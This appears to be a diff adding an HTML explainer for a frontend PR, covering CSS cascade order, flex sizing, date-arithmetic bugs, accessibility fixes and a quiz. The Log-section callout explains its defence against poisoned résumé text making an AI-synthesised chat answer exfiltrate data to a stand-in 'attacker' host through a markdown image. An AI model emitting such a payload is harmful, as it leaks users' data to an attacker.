@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Four views, fifteen findings, and a calendar that starts on a Thursday</title>
+</head>
+<body>
+<style>
+  :root {
+    --bg: #fafaf8; --fg: #1a1a1a; --accent: #b5541f; --muted: #6b6b6b;
+    --code-bg: #282c34; --code-fg: #e6e6e6; --callout-bg: #fff4e8; --border: #e0ddd6;
+  }
+  body { font-family: Georgia, 'Times New Roman', serif; background: var(--bg); color: var(--fg);
+    max-width: 820px; margin: 0 auto; padding: 2rem 1.5rem 6rem; line-height: 1.65; }
+  h1 { font-size: 1.9rem; border-bottom: 3px solid var(--accent); padding-bottom: .5rem; }
+  h2 { font-size: 1.4rem; margin-top: 3rem; color: var(--accent); }
+  h3 { font-size: 1.1rem; margin-top: 1.8rem; }
+  code { font-family: 'SF Mono', Consolas, monospace; background: #eee; padding: .1rem .3rem; border-radius: 3px; font-size: .92em; }
+  pre { background: var(--code-bg); color: var(--code-fg); padding: 1rem 1.2rem; border-radius: 8px;
+    overflow-x: auto; white-space: pre-wrap; font-family: 'SF Mono', Consolas, monospace; font-size: .88rem; line-height: 1.5; }
+  pre code { background: none; padding: 0; color: inherit; }
+  .callout { background: var(--callout-bg); border-left: 4px solid var(--accent); padding: .9rem 1.2rem;
+    border-radius: 0 6px 6px 0; margin: 1.2rem 0; }
+  .toc { background: #fff; border: 1px solid var(--border); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; }
+  .toc a { color: var(--accent); text-decoration: none; }
+  .toc ul { margin: .3rem 0; }
+  .diagram { background: #fff; border: 1px solid var(--border); border-radius: 10px; padding: 1.2rem;
+    margin: 1.2rem 0; font-family: 'SF Mono', Consolas, monospace; font-size: .85rem; }
+  .flow { display: flex; align-items: center; gap: .6rem; flex-wrap: wrap; justify-content: center; padding: .5rem 0; }
+  .box { border: 2px solid var(--accent); border-radius: 8px; padding: .6rem 1rem; background: #fdf6ee; text-align: center; min-width: 120px; }
+  .box.fail { border-color: #b91c1c; background: #fef2f2; }
+  .arrow { font-size: 1.4rem; color: var(--muted); }
+  table { border-collapse: collapse; width: 100%; margin: 1rem 0; font-size: .92rem; }
+  th, td { border: 1px solid var(--border); padding: .5rem .7rem; text-align: left; }
+  th { background: #f0ede6; }
+  .quiz-q { background: #fff; border: 1px solid var(--border); border-radius: 10px; padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+  .quiz-opt { display: block; width: 100%; text-align: left; padding: .6rem 1rem; margin: .4rem 0;
+    border: 1px solid var(--border); border-radius: 6px; background: #fff; cursor: pointer; font-family: inherit; font-size: .95rem; }
+  .quiz-opt:hover { background: #f5f2ec; }
+  .feedback { display: none; margin-top: .6rem; padding: .6rem 1rem; border-radius: 6px; font-size: .9rem; }
+  .feedback.correct { background: #ecfdf3; color: #166534; border-left: 3px solid #16a34a; }
+  .feedback.incorrect { background: #fef2f2; color: #991b1b; border-left: 3px solid #dc2626; }
+  .badge { display: inline-block; font-size: .75rem; padding: .15rem .5rem; border-radius: 10px; font-family: sans-serif; }
+  .badge.new { background: #dcfce7; color: #166534; }
+  @media (max-width: 600px) { body { padding: 1rem; } .flow { flex-direction: column; } }
+</style>
+
+<h1>Four views, fifteen findings, and a calendar that starts on a Thursday</h1>
+<p style="color:var(--muted); margin-top:-.5rem;">v1.1 slice 2 · Log, Timeline, Import, Details · Prepared 2026-08-08 · PR #48</p>
+
+<div class="toc">
+<strong>Contents</strong>
+<ul>
+  <li><a href="#background">Background</a></li>
+  <li><a href="#intuition">Intuition</a></li>
+  <li><a href="#code">Code walkthrough</a></li>
+  <li><a href="#quiz">Quiz</a></li>
+</ul>
+</div>
+
+<h2 id="background">Background</h2>
+<p>CareerVault's frontend is a React + Vite single-page app (<strong>ADR-003</strong>) served from S3 behind CloudFront (<strong>ADR-019</strong>), talking to API Gateway with a Cognito JWT (<strong>ADR-025</strong>). Slice 1 rebuilt the <em>shell</em> — header, navigation, and a new Home — on a fresh design-token layer. This slice rebuilt four of the five views behind that shell. It is a pure frontend diff: no Lambda, no DynamoDB, no SAM template, nothing deployed.</p><p>That makes it an unusually good slice to learn from, because nothing here is hidden behind a cloud service. Every bug in it is a bug you can reason about from first principles — and there were fifteen.</p><h3>Skippable if you know CSS: what a design token actually is</h3><p>A <strong>CSS custom property</strong> is a variable you declare on a selector and read with <code>var()</code>:</p><pre><code>:root {
+  --surface: #12121c;   /* declare, usually on the root element */
+}
+
+.card {
+  background: var(--surface);   /* read */
+}</code></pre><p>The reason CareerVault funnels <em>every</em> colour through these is <strong>ADR-044</strong>: the app ships light and dark themes, and a theme swap is then just re-declaring the same names under a media query. A raw <code>#12121c</code> written directly into a component's stylesheet silently opts that one rule out of theming — and because the team reviews in dark mode, it is a <em>light-mode</em> bug that dark-mode review cannot see. Hence the standing rule: <code>index.css</code> is the only file in the app allowed to define a colour.</p><div class="callout"><strong>The sharp edge:</strong> an <em>unset</em> custom property does not fall back to anything. <code>var(--nope)</code> resolves to nothing at all, and the declaration is dropped. This is why slice 1 could not simply rename the old token set — five feature stylesheets still referenced the old names, and renaming would have rendered those views colourless rather than throwing an error. Slice 1 left behind a deliberate <em>compatibility shim</em>: five one-line aliases mapping old names to new ones, to be deleted view by view.</p></div><h3>Skippable if you know it: the accessibility tree</h3><p>Every browser builds a second tree alongside the DOM — the <strong>accessibility tree</strong> — which is what a screen reader actually reads. Elements land in it with a <em>role</em> (button, heading, log), an <em>accessible name</em>, and state. Most of the time the mapping is automatic and invisible, which is precisely the problem: an interface can be completely broken in that tree while looking perfect on screen, and no test, typecheck, or lint run will say a word.</p><p>Slice 1 ran an audit that enumerated eighteen such findings. Nine were fixed there; the rest were filed against the views that would fix them. This slice inherited <strong>A4</strong> (the chat transcript announced nothing), <strong>A5</strong> (message authorship was conveyed by <em>which side of the screen the bubble sat on</em> — invisible to a screen reader), <strong>A6</strong> (the typing indicator announced as a literal "…"), <strong>A7</strong> (a bare "Retry" button unattached to any message) and <strong>A9</strong> (the file upload input had no accessible name at all).</p>
+
+<h2 id="intuition">Intuition</h2>
+<p>Four ideas in this slice are worth carrying away. Each one is a case where a reasonable mental model quietly disagreed with how the machine actually behaves.</p><h3>1. Vite bundles CSS child-first, which inverts the cascade you expect</h3><p>When two CSS rules have equal specificity, the one that appears <em>later</em> in the stylesheet wins. So this looks obviously fine:</p><pre><code>// App.css — the shared layer
+.card { flex-direction: column; }
+
+// settings.css — a specific view
+.data-card { flex-direction: row; }   /* surely this wins? */</code></pre><p>Both selectors are one class, so specificity is a tie, and the view-specific rule is "more specific" in the human sense. But which one is <em>later</em> depends entirely on the order the bundler emits them — and Vite emits CSS in <strong>module-graph order</strong>. <code>App.tsx</code> imported its child components above its own stylesheet, so every child's CSS landed in the bundle <em>first</em>:</p><div class="diagram"><div class="flow"><div class="box">index.css<br><small>tokens</small></div><div class="arrow">→</div><div class="box fail">settings.css<br><small>.data-card { row }</small></div><div class="arrow">→</div><div class="box">App.css<br><small>.card { column } ← wins</small></div></div></div><p>The card rendered as a centred column instead of a row. Nothing errored. The fix was one line — move <code>import './App.css'</code> above the component imports — which restores the order everyone already assumes: <strong>tokens → shared → feature</strong>.</p><div class="callout"><strong>The generalisable bit:</strong> "more specific" is not a thing CSS knows about your architecture. If your layering depends on source order, something has to <em>guarantee</em> that order. Here it is a single import placed deliberately, with a comment explaining why moving it would break things.</div><h3>2. <code>flex: 1</code> is not "take the space" — it silently overrides your height</h3><p>The chat panel is a column: header, scrolling transcript, composer. The transcript was written as:</p><pre><code>.messages {
+  flex: 1;        /* "grow to fill" */
+  height: 400px;  /* the design's specified height */
+}</code></pre><p>The panel collapsed to the size of a single message bubble. <code>flex: 1</code> is shorthand for <code>flex-grow: 1; flex-shrink: 1; flex-basis: 0%</code> — and <code>flex-basis</code> takes precedence over <code>height</code> on the main axis. The declared 400px was never consulted. Writing <code>flex: 1 1 auto</code> instead makes <code>flex-basis</code> defer to <code>height</code>, so the height becomes a <em>preferred</em> size that can still shrink.</p><p>One more piece was needed. A flex item's automatic minimum size is its content, so a long transcript would push the panel open rather than scrolling inside it. <code>min-height: 0</code> is what actually permits the shrink — a two-character declaration that is the difference between "scrolls" and "overflows".</p><h3>3. The Unix epoch is a Thursday</h3><p>This is the slice's best bug. CareerVault tracks a <em>streak</em>: consecutive cadence periods in which you logged at least one entry. Periods are calendar-anchored (<strong>ADR-045</strong>), so a week runs Monday to Monday. Two functions need to agree: <code>periodIndex(date)</code> gives a period a number, and <code>periodStart(date)</code> gives the timestamp it began at.</p><p>For a fortnight, <code>periodStart</code> was written as "take the week index, round down to an even number, multiply back into a timestamp":</p><pre><code>Math.floor(weekIndex / 2) * 2 * WEEK_MS</code></pre><p>Reasonable — and wrong, because a week <em>index</em> cannot be converted back into a timestamp by multiplying. Timestamps count from 1 January 1970, and <strong>that day was a Thursday</strong>. Every exact multiple of one week from the epoch is therefore also a Thursday:</p><div class="diagram"><div class="flow"><div class="box">1 Jan 1970<br><small>Thursday</small></div><div class="arrow">+7d</div><div class="box">8 Jan 1970<br><small>Thursday</small></div><div class="arrow">…</div><div class="box fail">30 Jul 2026<br><small>Thursday</small></div></div></div><p>So <code>periodStart</code> returned a Thursday — four days <em>before</em> the Monday the period actually began, which put it in the <em>previous</em> fortnight entirely. Verified numerically: for 8 August 2026, <code>periodIndex(date)</code> was 1476 while <code>periodIndex(periodStart(date))</code> was 1475. The two functions disagreed by a whole period, so the sidebar's "logged this period" list and the streak counted different fortnights, and the heading read "Logged since Thursday" for a week starting Monday.</p><p>The fix steps back from a known Monday instead of multiplying into one. The <em>test</em> is the more interesting artifact: rather than asserting specific dates, it asserts the invariant that was broken — <code>periodIndex(periodStart(d)) === periodIndex(d)</code>, across four cadences and forty dates.</p><h3>4. Elapsed time is not calendar days</h3><p>The Log opens by naming your most recent entry and how long ago it was. The handoff hardcoded "It's been a week…", which is false for anyone who logged something yesterday, so the slice measured it instead. The first implementation:</p><pre><code>Math.floor((now - then) / 24_HOURS)</code></pre><p>Log something at 23:00; open the app at 09:00 the next morning. Ten hours have elapsed, which floors to zero days, so the app says <em>"You logged X today"</em> about something you logged yesterday — the exact class of misstatement the function was written to prevent. The same arithmetic makes every boundary drift by the time of day: 6d23h reads as "6 days", 7d1h as "a week".</p><div class="callout"><strong>Rule of thumb:</strong> if a human would answer the question by looking at a calendar, compute it on a calendar. Truncate both instants to their date first, then subtract. Dividing by 86,400,000 answers a different question than the one users are asking.</div><h3>Cross-cloud parallel</h3><p>Nothing in this slice is AWS-specific, which is itself worth noticing: the static-hosting shape (<strong>ADR-019</strong>) is CloudFront + S3 on AWS, Front Door + Blob Storage static websites on Azure, and Cloud CDN + Cloud Storage on GCP. The interesting consequence is <em>where a security control has to live</em>. Self-hosting the web fonts (below) removed the app's only external subresource, but a <code>Content-Security-Policy</code> header is configured on the CDN, not in the app — an AWS <code>ResponseHeadersPolicy</code>, an Azure Front Door rule set, a GCP URL-map response-header action. Same control, three different places, none of them the code. That is logged as <strong>B-038</strong>.</p>
+
+<h2 id="code">Code walkthrough</h2>
+<h3>The shared layer, extracted first</h3><p>Slice 1 put <code>.card</code>, <code>.eyebrow</code>, <code>.chip</code> and friends in <code>home.css</code>, because Home was the only redesigned view. Four more views now needed the same vocabulary. The options were to import Home's stylesheet from Timeline (a dependency asserting a relationship that does not exist) or to copy the values (which is how two cards drift apart). Neither is good, so the primitives moved to <a href="frontend/src/App.css">frontend/src/App.css</a> — a layer that always loads and already owns the shell.</p><p>One rule came out of that move and is written into the file: <strong>padding lives on <code>.view</code> alone</strong>. A view stylesheet layers <code>max-width</code> and its own internals, never the page padding — otherwise six views drift apart by a few pixels each.</p><h3>The Log: a live region, and who said what</h3><p><a href="frontend/src/chat/Chat.tsx">Chat.tsx</a> carries four of the five inherited accessibility findings. The transcript became a <code>role="log"</code> container with <code>aria-live="polite"</code>, which is the ARIA role for exactly this — a region where new content is appended in meaningful order — so an assistant reply is announced instead of appearing silently (<strong>A4</strong>).</p><p>Authorship (<strong>A5</strong>) was previously conveyed only by alignment: user bubbles right, assistant bubbles left. That is invisible in the accessibility tree. Each message now carries a visually-hidden prefix:</p><pre><code>&lt;div className="msg user"&gt;
+  &lt;span className="sr-only"&gt;You said:&lt;/span&gt;
+  &lt;p className="bubble-user"&gt;{turn.text}&lt;/p&gt;</code></pre><p>And the retry button (<strong>A7</strong>) names the message it will resend — <code>aria-label={`Retry sending: ${excerpt(turn.text)}`}</code> — so it is not one of several identical "Retry" buttons with no context.</p><div class="callout"><strong>Load-bearing, not stylistic:</strong> <code>{turn.text}</code> renders as a text node. Entry content can originate in an uploaded résumé, so an answer synthesised from it is not fully trusted; a markdown renderer here would let a poisoned entry emit <code>![](https://attacker/?d=…)</code> and exfiltrate on image load. This is <strong>B-012</strong> / <strong>ADR-038</strong>, and it now has a regression test that feeds real markup through the answer path and asserts no <code>&lt;img&gt;</code> element exists.</div><h3>The Timeline: an overlay that expires during render</h3><p>The shell owns the entry list, so <a href="frontend/src/entries/Timeline.tsx">Timeline.tsx</a> reports edits upward and waits for a refetch — measured at ~3.6s cold. Waiting meant a rename was invisible for that whole window, and a delete was worse: the row survived, so the selection fell back onto the record that had just been deleted and the panel offered Edit and Delete on something that no longer existed.</p><p>The fix is a local overlay of edits and deletes, layered over the shell's list. The subtlety is <em>when it expires</em>. The obvious approach — an effect watching <code>entries</code> — costs a second render pass on every refetch and leaves one paint showing stale data on top of fresh. Instead the overlay records the array it was built against, and is discarded during render when that identity changes:</p><pre><code>const active = overlay.source === entries ? overlay : emptyOverlay(entries);</code></pre><p>The same reasoning removed a second effect. Deleting the last record of a type removes its filter chip but left the filter <em>selected</em>, showing a populated vault with an empty list and no active chip. Rather than correcting the state from an effect, the effective filter is derived:</p><pre><code>const activeFilter = filters.some(f =&gt; f.id === filter) ? filter : "ALL";</code></pre><p>No render can observe the invalid value, and <code>filter</code> stays a record of what the user actually chose — so re-adding a certification restores their filter rather than having silently reset it.</p><h3>Details: rebuilding a native control means rebuilding its keyboard</h3><p>The cadence picker in <a href="frontend/src/settings/Settings.tsx">Settings.tsx</a> replaced a <code>&lt;select&gt;</code> with styled buttons carrying <code>role="radio"</code>. Roles describe; they do not implement. A native select gives arrow keys, Home/End, and a single tab stop for free; the replacement shipped four tab stops and dead arrow keys — a net accessibility regression in the slice meant to <em>close</em> accessibility findings. <code>useRovingRadio</code> restores the WAI-ARIA radiogroup contract: one tab stop via roving <code>tabIndex</code>, arrows and Home/End moving both selection and focus.</p><p>A related judgement: when check-ins are paused the options use <code>aria-disabled</code> rather than <code>disabled</code>. A disabled button leaves the tab order entirely, so a keyboard user would find the control had vanished with no explanation. <code>aria-disabled</code> keeps it reachable and readable, and inert.</p><h3>Details: the export, and a download that can vanish</h3><p>The JSON export is the slice's one genuinely new feature, and it follows <strong>ADR-045</strong>'s pattern — derive in the browser rather than add an endpoint. <code>GET /entries</code> is already fetched, so the export is a <code>Blob</code> over data in hand. The backend strips embedding vectors before returning entries (<code>career_crud/handler.py:61</code>), so the file is clean records rather than megabytes of floats.</p><p>The first version revoked the blob URL immediately after <code>click()</code>, on an anchor never added to the document. That works in Chrome and is not specified: Firefox and WebKit queue the download of a detached anchor, so tearing the URL down in the same task can leave it fetching a dead URL — the user clicks Export and silently gets nothing. The fix appends the anchor, clicks, removes it, and defers the revoke by one task.</p><h3>Import: a label that is also a dropzone</h3><p>Finding <strong>A9</strong> — the file input had no accessible name at all — is fixed by the design's own dropzone. Wrapping a visually-hidden input in a <code>&lt;label&gt;</code> gives it a name, makes the whole panel a click target, and keeps native file-input semantics. "Visually hidden" matters: <code>display: none</code> would remove it from the tab order and the accessibility tree, trading one barrier for another. It is hidden by clipping, and the focus ring is driven from <code>:focus-within</code> on the label since the input itself cannot show one.</p><h3>Retiring the scaffolding — and a prediction that was wrong</h3><p>The slice plan said "four of five shim aliases deleted". Only one could go. The aliases were never one-per-view: <code>resume.css</code> alone still references four of them, so they die together when the Résumés view is rebuilt. The plan asserted a fact about the codebase that thirty seconds of <code>grep</code> would have contradicted.</p><p>What the slice did instead is arguably more useful than being right: the remaining aliases are now <em>named</em>, with the command that verifies them written into the comment, and the completion condition is filed as <strong>B-036</strong> rather than left in someone's memory.</p><h3>Fonts, self-hosted</h3><p><strong>B-032</strong> replaced a Google Fonts <code>@import</code> with four vendored <code>woff2</code> files (73 KB). Both families are <em>variable</em> fonts, so one file per character subset covers every weight — hence <code>font-weight: 400 700</code> ranges rather than one <code>@font-face</code> per weight. The motivation was security: <code>@import</code> admits no subresource integrity and the app sets no CSP, so a compromised font CDN could serve arbitrary CSS. That cannot execute script, but attribute-selector background URLs can exfiltrate — and this app holds a career history.</p>
+
+<h2 id="quiz">Quiz</h2>
+
+<div class="quiz-q">
+<p><strong>A view stylesheet declares &lt;code&gt;.data-card { flex-direction: row }&lt;/code&gt; and the shared App.css declares &lt;code&gt;.card { flex-direction: column }&lt;/code&gt;. The element has both classes and renders as a column. Why?</strong></p>
+<button class="quiz-opt" data-correct="false"><code>.card</code> is more specific than <code>.data-card</code> because it is declared on a shared layer.</button>
+<button class="quiz-opt" data-correct="true">Vite emitted App.css after the view's stylesheet, so at equal specificity the shared rule won on source order.</button>
+<button class="quiz-opt" data-correct="false"><code>flex-direction</code> cannot be overridden once set by an ancestor rule.</button>
+<button class="quiz-opt" data-correct="false">The view stylesheet failed to load, so only App.css applied.</button>
+</div>
+
+<div class="quiz-q">
+<p><strong>&lt;code&gt;.messages&lt;/code&gt; is a flex column child with both &lt;code&gt;flex: 1&lt;/code&gt; and &lt;code&gt;height: 400px&lt;/code&gt;, and it collapses to its content size. What is happening?</strong></p>
+<button class="quiz-opt" data-correct="false"><code>flex: 1</code> only applies when the parent has an explicit height, and it silently does nothing otherwise.</button>
+<button class="quiz-opt" data-correct="false"><code>height</code> is ignored on any element with <code>overflow-y: auto</code>.</button>
+<button class="quiz-opt" data-correct="true"><code>flex: 1</code> expands to <code>flex-basis: 0%</code>, which takes precedence over <code>height</code> on the main axis.</button>
+<button class="quiz-opt" data-correct="false">The 400px is being interpreted as a maximum rather than a fixed height.</button>
+</div>
+
+<div class="quiz-q">
+<p><strong>Converting a week index back to a timestamp with &lt;code&gt;weekIndex * WEEK_MS&lt;/code&gt; produced a Thursday instead of a Monday. What is the underlying reason?</strong></p>
+<button class="quiz-opt" data-correct="false"><code>Math.floor</code> on a negative week index rounds toward zero and loses the day offset.</button>
+<button class="quiz-opt" data-correct="false">Leap seconds accumulate to shift the week boundary by several days over five decades.</button>
+<button class="quiz-opt" data-correct="true">The Unix epoch (1 Jan 1970) fell on a Thursday, so every exact week-multiple from it is also a Thursday.</button>
+<button class="quiz-opt" data-correct="false">JavaScript's <code>Date</code> counts weeks from Sunday, introducing a four-day offset.</button>
+</div>
+
+<div class="quiz-q">
+<p><strong>An entry logged at 23:00 was described as &quot;logged today&quot; when the app was opened at 09:00 the next morning. What was wrong with &lt;code&gt;Math.floor((now - then) / DAY_MS)&lt;/code&gt;?</strong></p>
+<button class="quiz-opt" data-correct="false"><code>DAY_MS</code> must account for daylight-saving transitions, which shift the result by an hour.</button>
+<button class="quiz-opt" data-correct="false"><code>Math.floor</code> should have been <code>Math.ceil</code>; every other part of the calculation was correct.</button>
+<button class="quiz-opt" data-correct="false">The subtraction returns a string, so <code>Math.floor</code> silently produced zero.</button>
+<button class="quiz-opt" data-correct="true">It measures elapsed duration, not calendar days — 10 hours floors to 0 — so the boundary moves with the time of day something was logged.</button>
+</div>
+
+<div class="quiz-q">
+<p><strong>The Timeline expires its local edit/delete overlay by comparing &lt;code&gt;overlay.source === entries&lt;/code&gt; during render, rather than resetting it from a &lt;code&gt;useEffect&lt;/code&gt; watching &lt;code&gt;entries&lt;/code&gt;. What does that buy?</strong></p>
+<button class="quiz-opt" data-correct="false">Effects cannot read props, so comparing identities inside one would not have been possible.</button>
+<button class="quiz-opt" data-correct="false">It lets the overlay be shared with Home and the Log without lifting state into the shell.</button>
+<button class="quiz-opt" data-correct="false">It makes the overlay survive the refetch, so local edits are never lost.</button>
+<button class="quiz-opt" data-correct="true">No render can observe a stale overlay layered on fresh data, and it avoids a second render pass on every refetch.</button>
+</div>
+
+<script>
+document.querySelectorAll('.quiz-q').forEach(q => {
+  q.querySelectorAll('.quiz-opt').forEach(opt => {
+    opt.addEventListener('click', () => {
+      const correct = opt.dataset.correct === 'true';
+      let fb = opt.nextElementSibling;
+      if (!fb || !fb.classList.contains('feedback')) {
+        fb = document.createElement('div');
+        fb.className = 'feedback';
+        opt.insertAdjacentElement('afterend', fb);
+      }
+      fb.textContent = correct ? '\u2705 Correct.' : '\u274c Not quite \u2014 reread the section above.';
+      fb.className = 'feedback ' + (correct ? 'correct' : 'incorrect');
+      fb.style.display = 'block';
+    });
+  });
+});
+</script>
+
+</body>
+</html>
